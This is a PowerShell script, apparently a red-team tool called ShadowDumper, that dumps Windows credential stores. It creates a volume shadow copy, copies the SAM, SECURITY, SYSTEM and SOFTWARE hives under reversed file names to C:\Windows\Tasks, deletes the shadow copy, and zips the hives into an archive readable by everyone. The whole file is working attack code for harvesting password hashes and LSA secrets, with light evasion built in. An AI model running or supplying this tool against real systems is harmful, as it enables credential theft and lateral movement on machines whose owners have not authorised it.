<#
    Author: vari.sh

    Description: This script lets you dump SAM, SECURITY, SYSTEM, SOFTWARE without using Rubeus or Mimikatz.
                 It creates a shadow copy of C: and copies the files to C:\Windows\Tasks, then compresses them into a ZIP archive.
                 Warning: it needs Administrator privileges.
    Usage: .\ShadowDumper.ps1
#>

# Get current user
$actualUser = $env:USERNAME
$outputPath = "C:\Windows\Tasks"

Write-Output "[+] Creating shadow copy"
# Create C: shadow copy
wmic shadowcopy call create Volume='C:\' > $null 2>&1

# Get shadow copy ID and Path
$shadowCopyID = (vssadmin list shadows | Select-String -Pattern "Shadow Copy ID:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()
$shadowCopyPath = (vssadmin list shadows | Select-String -Pattern "Shadow Copy Volume:" | Select-Object -Last 1).ToString().Split(':')[1].Trim()

Write-Output "[*] ShadowCopy UUID: $shadowCopyID"
Write-Output "[*] ShadowCopy Path: $shadowCopyPath"

# Mount shadow copy
$mountPoint = "$outputPath\backup"
Write-Output "[+] Mounting shadow copy in $mountPoint"
cmd /c "mklink /d $mountPoint $shadowCopyPath"

# Get timestamps
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$zipFilePath = "$outputPath\backup_$timestamp.zip"

# Copy LSA files
Write-Output "[+] Copying SAM..."
copy "$mountPoint\windows\system32\config\sam" "$outputPath\${timestamp}_mas"
Write-Output "[+] Copying SECURITY..."
copy "$mountPoint\windows\system32\config\security" "$outputPath\${timestamp}_ytiruces"
Write-Output "[+] Copying SYSTEM..."
copy "$mountPoint\windows\system32\config\system" "$outputPath\${timestamp}_metsys"
Write-Output "[+] Copying SOFTWARE..."
copy "$mountPoint\windows\system32\config\software" "$outputPath\${timestamp}_erawtfos"

# Deletes mounted folder
Write-Output "[-] Deleting symlink"
rm $mountPoint

# Delete shadow copy
Write-Output "[-] Deleting shadow copy"
vssadmin delete shadows /Shadow="$shadowCopyID" /Quiet > $null 2>&1

# Compress files into a ZIP archive
Write-Output "[+] Creating ZIP archive: $zipFilePath"
Compress-Archive -Path "$outputPath\${timestamp}_mas", "$outputPath\${timestamp}_ytiruces", "$outputPath\${timestamp}_metsys", "$outputPath\${timestamp}_erawtfos" -DestinationPath $zipFilePath

# Modify permissions to make the ZIP file readable by everyone
Write-Output "[+] Modifying ZIP file permissions"
$acl = Get-Acl $zipFilePath
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$acl.SetAccessRule($accessRule)
Set-Acl -Path $zipFilePath -AclObject $acl

# Remove original files
Write-Output "[-] Removing extracted files"
Remove-Item "$outputPath\${timestamp}_mas", "$outputPath\${timestamp}_ytiruces", "$outputPath\${timestamp}_metsys", "$outputPath\${timestamp}_erawtfos" -Force

Write-Output "[+] Operation completed. Archive saved at $zipFilePath"
